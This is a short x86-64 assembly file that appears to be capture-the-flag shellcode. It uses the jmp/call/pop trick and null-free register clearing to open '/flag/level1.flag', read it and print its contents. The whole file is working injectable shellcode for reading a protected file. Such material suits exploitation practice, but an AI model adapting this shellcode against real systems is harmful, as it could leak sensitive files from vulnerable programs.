;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

[BITS 64]

%define SYS_READ	0
%define SYS_WRITE	1
%define SYS_OPEN	2
%define SYS_EXIT	60

%define NULL		0

%define STDIN		0
%define	STDOUT		1
%define STDERR		2

%define BUFLEN		64

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

[SECTION .TEXT]
	global _start

_start:
	xor rax, rax
	xor rdx, rdx
	xor rdi, rdi
	xor rsi, rsi
	jmp _push

_open:
	pop rdi
	mov al, SYS_OPEN
	syscall

_read:
	mov rdi, rax
	mov dl, BUFLEN
	sub rsp, rdx
	mov rsi, rsp
	xor rax, rax
	syscall

_puts:
	mov rdx, rax
	mov dil, STDOUT
	mov al, SYS_WRITE
	syscall

_exit:
	xor rax, rax
	mov al, SYS_EXIT
	xor rdi, rdi
	syscall

_push:
	call _open
	path: db "/flag/level1.flag"

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;